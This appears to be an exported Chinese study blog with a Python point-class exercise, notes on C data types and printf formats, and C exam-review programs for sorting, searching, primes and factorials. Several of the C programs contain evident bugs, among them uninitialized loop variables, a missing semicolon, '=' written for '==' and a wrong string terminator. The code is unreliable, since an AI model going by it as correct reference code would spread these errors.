main()</span><br></pre></td></tr></table></figure><p>练习2：定义一个类描述平面上的点并提供移动点和计算到另一个点距离的方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x=<span class="number">0</span>, y=<span class="number">0</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化方法</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        :param x: 横坐标</span></span><br><span class="line"><span class="string">        :param y: 纵坐标</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.x = x</span><br><span class="line">        self.y = y</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">move_to</span>(<span class="params">self, x, y</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;移动到指定位置</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        :param x: 新的横坐标</span></span><br><span class="line"><span class="string">        &quot;param y: 新的纵坐标</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.x = x</span><br><span class="line">        self.y = y</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">move_by</span>(<span class="params">self, dx, dy</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;移动指定的增量</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        :param dx: 横坐标的增量</span></span><br><span class="line"><span class="string">        &quot;param dy: 纵坐标的增量</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.x += dx</span><br><span class="line">        self.y += dy</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">distance_to</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;计算与另一个点的距离</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        :param other: 另一个点</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        dx = self.x - other.x</span><br><span class="line">        dy = self.y - other.y</span><br><span class="line">        <span class="keyword">return</span> sqrt(dx ** <span class="number">2</span> + dy ** <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;(%s, %s)&#x27;</span> % (<span class="built_in">str</span>(self.x), <span class="built_in">str</span>(self.y))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    p1 = Point(<span class="number">3</span>, <span class="number">5</span>)</span><br><span class="line">    p2 = Point()</span><br><span class="line">    <span class="built_in">print</span>(p1)</span><br><span class="line">    <span class="built_in">print</span>(p2)</span><br><span class="line">    p2.move_by(-<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(p2)</span><br><span class="line">    <span class="built_in">print</span>(p1.distance_to(p2))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言学习</title>
      <link href="/2023/12/25/c/"/>
      <url>/2023/12/25/c/</url>
      
        <content type="html"><![CDATA[<h1>c语言</h1><h2 id="变量和数据类型">变量和数据类型</h2><h3 id="数据类型（data-type">数据类型（data type)</h3><p>数据是放在内存中的，变量是 给这块内存起的名字，有了变量就嫩找到并使用这份数据。</p><p>字符型 char 1</p><p>短整型 short 2</p><p>整型 int 4</p><p>长整型 long  4</p><p>单精度浮点型 float 4</p><p>双精度浮点型 double 8</p><p>无类型 void</p><p>(最基本的数据类型,数字为数据的长度)</p><p>数据类型只在定义变量时指明，而且必须指明；使用变量时无需再指明，因为此时的数据类型已经确定了。</p><h3 id="数据的输出">数据的输出</h3><p>我们可以使用puts来输出字符串，puts只能用来输出字符串。</p><p>而printf可以输出许多类型的数据.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,a);</span><br></pre></td></tr></table></figure><p>其中%d叫做格式控制符,格式控制符均以%开头，后面跟其他的字符</p><p>%d 十进制</p><p>%c 字符</p><p>%s 字符串</p><p>%f小数</p><p>puts函数将较长的字符串可以分割成几个短的字符串</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;s&quot;</span> <span class="string">&quot;s&quot;</span> <span class="string">&quot;s&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="C语言当中的整数">C语言当中的整数</h3><p>int 一般占用四个字节，共计32bit，其数字非常大。</p><p>可以用short long让其内存占用更少或者更多。</p><p>占用字节数如下</p><p>2 ≤ short ≤ int ≤ long</p><h3 id="sizeof操作符">sizeof操作符</h3><p>获取某个数据类型的长度可以用sizeof操作符</p><p>sizeof 用来获取某个数据类型或变量所占用的字节数，如果后面跟的是变量名称，那么可以省略<code>( )</code>，如果跟的是数据类型，就必须带上<code>( )</code>。</p><p>%hd用来输出short int</p><p>%d用来输出int</p><p>%ld用来输出long int</p><h3 id="二进制八进制十六进制">二进制八进制十六进制</h3><h4 id="进制的开头">进制的开头</h4><p>二进制的开头必须使用0b或者0B</p><p>八进制必须用0开头</p><p>十六进制由0~9字母a~f（A~F)组成，使用时必须使用0x或者0X开头</p><h4 id="进制的printf">进制的printf</h4><p>​               short        int            long</p><p>八进制       %ho        %o           %lo</p><p>十进制          %hd         %d            %ld</p><p>十六进制         %hx           %x             %lx</p><p>大小写表示用大写还是小写来输出十六进制数</p><p>区分不同进制数字的一个简单办法就是，在输出时带上特定的前缀。在格式控制符中加上<code>#</code>即可输出前缀，例如 %#x、%#o、%#lX、%#ho 等。</p><h3 id="c语言中的正负数">c语言中的正负数</h3><p>c语言中把内存的最高位作为符号位。在编程语言中计数常常从0开始，0作为第一位。</p><p>不希望设置符号位的时候可以输入unsigned关键字</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">short</span> a = <span class="number">12</span>;</span><br></pre></td></tr></table></figure><p>这样就没有符号位了。</p><p>无符号数的输出</p><p>unsigned short    unsigned int     unsigned long</p><p>八进制%        ho%           o%                  lo</p><p>十进制               %hu      %u                   %lu</p><p>十六进制  %hx 或者 %hX     %x 或者 %X      %lx 或者 %lX</p><h4 id="c语言中的小数">c语言中的小数</h4><ul><li><p>2.1E5 = 2.1×105，其中 2.1 是尾数，5 是指数。</p></li><li><p>3.7E-2 = 3.7×10-2，其中 3.7 是尾数，-2 是指数。</p></li><li><p>0.5E7 = 0.5×107，其中 0.5 是尾数，7 是指数。</p><p>float为单精度 double为双精度</p><p>float占用四个字节 double占用8个字节</p></li><li><p>printf输出小数的格式</p></li><li><p>%f 以十进制形式输出 float 类型；</p></li><li><p>%lf 以十进制形式输出 double 类型；</p></li><li><p>%e 以指数形式输出 float 类型，输出结果中的 e 小写；</p></li><li><p>%E 以指数形式输出 float 类型，输出结果中的 E 大写；</p></li><li><p>%le 以指数形式输出 double 类型，输出结果中的 e 小写；</p></li><li><p>%lE 以指数形式输出 double 类型，输出结果中的 E 大写。</p><p>其中规则%f 和 %lf 默认保留六位小数，不足六位以 0 补齐，超过六位按四舍五入截断。将整数赋值给 float 变量时会变成小数。 以指数形式输出小数时，输出结果为科学计数法；也就是说，尾数部分的取值为：0 ≤ 尾数 &lt; 10。</p><p>小数的默认类型为double</p><p>将整数赋值给小数加0即可，将小说=数赋值给整数只能取其整数部分。</p><h4 id="字符">字符</h4><p>字符的经常类型为char 长度为1，只能容纳 ASCII 码表中的字符，也就是英文字符。字符类型由单引号<code>' '</code>包围，字符串由双引号<code>&quot; &quot;</code>包围。其中空格也是一个字符，在使用printf输出字符是，char对应的格式控制符为%c</p><p>转义字符串：</p><p>以\或者\x开头，以<code>\</code>开头表示后跟八进制形式的编码值，以<code>\x</code>开头表示后跟十六进制形式的编码值。对于转义字符来说，只能使用八进制或者十六进制。</p><p>转义字符的初衷是用于 ASCII 编码，所以它的取值范围有限：</p><ul><li>八进制形式的转义字符最多后跟三个数字，也即<code>\ddd</code>，最大取值是<code>\177</code>；</li><li>十六进制形式的转义字符最多后跟两个数字，也即<code>\xdd</code>，最大取值是<code>\x7f</code>。</li></ul></li></ul><table><thead><tr><th>转义字符</th><th>意义</th><th>ASCII码值（十进制）</th></tr></thead><tbody><tr><td>\a</td><td>响铃(BEL)</td><td>007</td></tr><tr><td>\b</td><td>退格(BS) ，将当前位置移到前一列</td><td>008</td></tr><tr><td>\f</td><td>换页(FF)，将当前位置移到下页开头</td><td>012</td></tr><tr><td>\n</td><td>换行(LF) ，将当前位置移到下一行开头</td><td>010</td></tr><tr><td>\r</td><td>回车(CR) ，将当前位置移到本行开头</td><td>013</td></tr><tr><td>\t</td><td>水平制表(HT)</td><td>009</td></tr><tr><td>\v</td><td>垂直制表(VT)</td><td>011</td></tr><tr><td>'</td><td>单引号</td><td>039</td></tr><tr><td>&quot;</td><td>双引号</td><td>034</td></tr><tr><td>\</td><td>反斜杠</td><td>092</td></tr></tbody></table><p><code>\n</code>和<code>\t</code>是最常用的两个转义字符：</p><ul><li><p><code>\n</code>用来换行，让文本从下一行的开头输出，前面的章节中已经多次使用；</p></li><li><p><code>\t</code>用来占位，一般相当于四个空格，或者 tab 键的功能。</p><p>强制转换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(type_name) expression</span><br></pre></td></tr></table></figure><p><code>type_name</code>为新类型名称，<code>expression</code>为表达式</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> C </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言期末复习3</title>
      <link href="/2023/12/25/dayc3/"/>
      <url>/2023/12/25/dayc3/</url>
      
        <content type="html"><![CDATA[<h1>某年某月某日</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> year,month,day;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;year,&amp;month);</span><br><span class="line">    <span class="keyword">switch</span>(month)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>: <span class="keyword">case</span> <span class="number">3</span>: <span class="keyword">case</span> <span class="number">5</span>: <span class="keyword">case</span> <span class="number">7</span>: <span class="keyword">case</span> <span class="number">8</span>: <span class="keyword">case</span> <span class="number">10</span>: <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">            day=<span class="number">31</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>: <span class="keyword">case</span> <span class="number">6</span>: <span class="keyword">case</span> <span class="number">9</span>: <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">            day=<span class="number">30</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>: day=(year%<span class="number">4</span>==<span class="number">0</span>&amp;&amp;year%<span class="number">100</span>!=<span class="number">0</span>||year%<span class="number">400</span>==<span class="number">0</span>)?<span class="number">29</span>:<span class="number">28</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d年%d月有%d天&quot;</span>,year,month,day);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>判断素数（函数）</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">is_prime</span><span class="params">(<span class="type">int</span> a)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i =<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(a&lt;=<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;=<span class="built_in">sqrt</span>(a);i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a%i==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>冒泡排序</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sortarr2</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> n)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;j&lt;n<span class="number">-1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;n-i;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(a[j]&lt;a[j<span class="number">-1</span>])&#123;</span><br><span class="line">                <span class="type">int</span> temp;</span><br><span class="line">                temp=a[j<span class="number">-1</span>];</span><br><span class="line">                a[j<span class="number">-1</span>]=a[j];</span><br><span class="line">                a[j]=temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1>选择排序</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sortarry1</span><span class="params">(<span class="type">int</span> *a,<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (j=i+<span class="number">1</span>;j&lt;n;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i]&gt;a[j])&#123;</span><br><span class="line">                <span class="type">int</span> temp;</span><br><span class="line">                temp=a[i];</span><br><span class="line">                a[i]=a[j];</span><br><span class="line">                a[j]=temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>二分查找</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>* a,<span class="type">int</span> key,<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> first;</span><br><span class="line">    <span class="type">int</span> last=n<span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> mid=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(first&lt;last)</span><br><span class="line">    &#123;</span><br><span class="line">        mid=(first+last)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(a[mid]&gt;=key)</span><br><span class="line">        &#123;</span><br><span class="line">            last=mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">            first=mid+<span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(a[last]==key)&#123;</span><br><span class="line">        <span class="keyword">return</span> mid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>数组最大值平均数</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_N 100</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">float</span> nums[MAX_N];</span><br><span class="line">    <span class="type">int</span> n,i;</span><br><span class="line">    <span class="type">float</span> max,avg;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入数组个数n=&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%f&quot;</span>,&amp;nums[i]);</span><br><span class="line">        avg+=nums[i];</span><br><span class="line">    &#125;   </span><br><span class="line">    max=nums[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++) (max&lt;nums[i])?(max=nums[i]):max;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;max=%.2f,avg=%.2f&quot;</span>,max,avg/n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>素数判断</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span> <span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,isprinme=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;=<span class="number">100</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (i==<span class="number">2</span>||i==<span class="number">3</span>) isprinme=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (i%<span class="number">6</span>==<span class="number">1</span>&amp;&amp;i%<span class="number">6</span>!=<span class="number">5</span>) isprinme=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">5</span>;j&lt;<span class="built_in">sqrt</span>(i);j+=<span class="number">6</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(i%j=<span class="number">0</span>||i%(j+<span class="number">2</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">                    isprinme=<span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    (isprinme==<span class="number">1</span>)?<span class="built_in">printf</span>(<span class="string">&quot;%d\t&quot;</span>,i):(isprinme=<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>水仙花数</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">100</span>;i&lt;<span class="number">1000</span>;i++) (i==<span class="built_in">pow</span>(i/<span class="number">100</span>,<span class="number">3</span>)+<span class="built_in">pow</span>(i%<span class="number">10</span>,<span class="number">3</span>)+<span class="built_in">pow</span>(i/<span class="number">10</span>%<span class="number">10</span>,<span class="number">3</span>))?<span class="built_in">printf</span>(<span class="string">&quot;%d\t&quot;</span>, i):<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1>大小写转换</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Max_n 100</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> strs[Max_n];</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入字符串&quot;</span>);</span><br><span class="line">    gets(strs);</span><br><span class="line">    <span class="keyword">while</span>(strs[i]!=<span class="string">&#x27;0&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strs[i]&gt;=<span class="number">65</span>&amp;&amp;strs[i]&lt;=<span class="number">90</span>) strs[i]+=<span class="number">32</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,strs[i++]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>杨辉三角的输出</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">tri</span><span class="params">(<span class="type">int</span> r,<span class="type">int</span> c)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (c==<span class="number">1</span>||c==r)?<span class="number">1</span>:tri(r<span class="number">-1</span>,c<span class="number">-1</span>)+tri(r<span class="number">-1</span>,c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j,n;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入杨辉三角的行数（1~20&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;n<span class="number">-1</span>;j++) <span class="built_in">printf</span>(<span class="string">&quot;%c%c%c&quot;</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>);</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=i;j++) <span class="built_in">printf</span>(<span class="string">&quot;%-6d&quot;</span>,tri(i,j));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>阶乘数的显示</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">kn</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (n==<span class="number">0</span>)?<span class="number">1</span>:n*kn(n<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> n,i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入阶乘数n:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d!=&quot;</span>,n);</span><br><span class="line">    <span class="keyword">for</span>(i=n;i&gt;<span class="number">0</span>;i--) (i!=<span class="number">1</span>)?<span class="built_in">printf</span>(<span class="string">&quot;%d*&quot;</span>,i):<span class="built_in">printf</span>(<span 